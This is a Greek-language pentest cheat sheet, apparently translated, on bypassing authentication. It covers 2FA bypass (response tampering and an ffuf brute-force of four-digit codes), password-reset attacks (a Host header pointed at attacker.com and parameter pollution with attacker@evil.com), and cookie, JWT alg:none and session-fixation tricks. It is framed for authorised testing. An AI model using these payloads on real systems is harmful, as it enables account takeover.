## Πριν ξεκινήσετε

Η **ταυτοποίηση (authentication)** επιβεβαιώνει ποιος είναι ο χρήστης. Διαφέρει από την **εξουσιοδότηση (authorization)**, που καθορίζει τι επιτρέπεται να κάνει. **2FA/MFA** σημαίνει χρήση δύο ή περισσότερων παραγόντων ταυτοποίησης.

**Βασικοί όροι:** session = συνεδρία, cookie = δεδομένο browser που μπορεί να συνδέεται με συνεδρία, reset token = στοιχείο επαναφοράς κωδικού, fixation = διατήρηση γνωστού αναγνωριστικού συνεδρίας μετά τη σύνδεση. Η τεκμηρίωση παράκαμψης απαιτεί πρόσβαση σε προστατευμένη ενέργεια στον server.

Οι παρακάτω δοκιμές αφορούν εργαστήρια ή στόχους που περιλαμβάνονται ρητά σε εγκεκριμένο έλεγχο. Οι διευθύνσεις, τα διαπιστευτήρια και τα αναγνωριστικά είναι ενδεικτικά. Οι εντολές και τα payloads διατηρούνται από το αγγλικό πρωτότυπο· δεν εκτελούνται κατά τη μετάφραση.

## 🔑 2FA/MFA: έλεγχοι παράκαμψης

### Τροποποίηση απόκρισης

> **Τοπική αλλαγή δεν σημαίνει παράκαμψη στον server:** Η τροποποίηση JSON ή status code στον proxy αλλάζει όσα βλέπει ο client. Υπάρχει ουσιαστικό εύρημα μόνο αν προκύπτει μη επιτρεπόμενη πρόσβαση ή ενέργεια που δέχεται ο server.

```http
# Αλλαγή false σε true
{"success": false} → {"success": true}
{"2fa_valid": false} → {"2fa_valid": true}
```

### Τροποποίηση κωδικού απόκρισης
```http
# Αλλαγή τοπικής απόκρισης 401/403 σε 200 για έλεγχο εξάρτησης του client
# Χρήση proxy για τοπική τροποποίηση απόκρισης
```

### Άμεση μετάβαση σε σελίδα
```http
# Μετά τη σύνδεση, έλεγχος άμεσης μετάβασης πέρα από τη σελίδα 2FA
/login → /2fa → /dashboard
# Έλεγχος άμεσης μετάβασης στο /dashboard
```

### Δοκιμή υποψήφιων κωδικών επιβεβαίωσης
```bash
# Τετραψήφιοι κωδικοί
ffuf -u https://target.com/2fa -X POST \
  -d "code=FUZZ" -w <(seq -w 0000 9999)
```

### Επαναχρησιμοποίηση κωδικού
```http
# Έλεγχος παλιών ή ληγμένων κωδικών
# Έλεγχος επαναχρησιμοποίησης ίδιου κωδικού
```

### Τιμές null ή κενές τιμές
```json
{"2fa_code": ""}
{"2fa_code": null}
{"2fa_code": "000000"}
```

## 🔓 Έλεγχοι επαναφοράς κωδικού

### Εισαγωγή τιμής στην κεφαλίδα Host
```http
POST /reset HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com

email=victim@target.com
```

### Διαχείριση tokens
```http
# Προβλέψιμα tokens
token=1
token=admin
token=base64(user_id)

# Επαναχρησιμοποίηση token
# Έλεγχος συσχέτισης token επαναφοράς με τον δεύτερο δοκιμαστικό λογαριασμό
```

### Πολλαπλές ή αμφίσημες παράμετροι
```http
email=attacker@evil.com&email=victim@target.com
email[]=attacker@evil.com&email[]=victim@target.com
```

### Τροποποίηση απόκρισης

> **Τοπική αλλαγή δεν σημαίνει παράκαμψη στον server:** Η τροποποίηση JSON ή status code στον proxy αλλάζει όσα βλέπει ο client. Υπάρχει ουσιαστικό εύρημα μόνο αν προκύπτει μη επιτρεπόμενη πρόσβαση ή ενέργεια που δέχεται ο server.

```json
// Έλεγχος παρουσίας token στην απόκριση
{"token": "abc123", "email": "victim@target.com"}
```

## 🛡️ Έλεγχοι συνεδριών και cookies

> **Συσχέτιση και επαλήθευση:** Αλλαγή cookie ή claim πρέπει να ελεγχθεί ως προς το πραγματικό αποτέλεσμα. Σωστή υπογραφή JWT, δέσμευση reset token στον λογαριασμό και ανανέωση αναγνωριστικού συνεδρίας μπορούν να απορρίπτουν τις αρχικές παραλλαγές.


### Τροποποίηση cookies
```http
# Αλλαγή τιμών
Cookie: isAdmin=false → isAdmin=true
Cookie: user_id=123 → user_id=1
Cookie: role=user → role=admin
```

### Τροποποίηση JWT
```json
// Αλλαγή πεδίων claims
{"role": "user"} → {"role": "admin"}
{"alg": "HS256"} → {"alg": "none"}
```

### Καθήλωση αναγνωριστικού συνεδρίας (session fixation)
```http
# Παράδειγμα καθήλωσης αναγνωριστικού συνεδρίας
# Ο δεύτερος δοκιμαστικός χρήστης συνδέεται με ήδη γνωστό αναγνωριστικό συνεδρίας
```

## 📊 Γρήγορη αναφορά

| Είδος παράκαμψης | Τεχνική |
| ------------- | ----------- |
| Σύνδεση | SQL injection και προεπιλεγμένα διαπιστευτήρια |
| 2FA | Τροποποίηση απόκρισης και δοκιμή κωδικών |
| Επαναφορά κωδικού πρόσβασης | Κεφαλίδα Host και επαναχρησιμοποίηση token |
| Συνεδρία | Τροποποίηση cookies και JWT |

### Σημεία που χρειάζονται έλεγχο
```
- Φόρμες σύνδεσης
- Ροές επαναφοράς κωδικού
- Υλοποιήσεις 2FA/MFA
- Λειτουργίες «Να με θυμάσαι»
- Επιβεβαίωση λογαριασμού
- Υλοποιήσεις OAuth
```
